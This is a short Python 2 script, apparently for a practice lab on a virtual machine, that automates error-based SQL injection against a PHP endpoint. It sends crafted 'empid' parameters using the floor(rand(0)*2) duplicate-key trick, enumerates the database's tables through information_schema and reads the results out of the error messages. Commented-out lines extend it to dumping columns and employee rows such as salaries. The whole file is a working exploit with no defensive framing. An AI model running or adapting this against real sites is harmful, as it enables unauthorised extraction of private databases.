#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "192.168.200.220" #가상 머신의 IP주소
   url = "/empinfo_id.php" #취약한 서브디렉토리 주소
   params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

#table_name = "Employees"
#column_name = "FirstName,Salary,HireDate"
rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
#rcount = "(select+count(*)+from+information_schema.columns+where+table_name='" +table_name + "')"
#rcount = "(select+count(*)+from+" +table_name + ")"

cnt = int(httpreq(rcount))
print "count : " + str(cnt)

for i in range(0,cnt):
   query = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   #query = "(select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+" + str(i) + ",1)"
   #query = "(select+concat_ws(','," + column_name + ")+from+" + table_name + "+limit+" + str(i) + ",1)"
   print "{0:>3}".format(str(i + 1)) + " : " + httpreq(query)
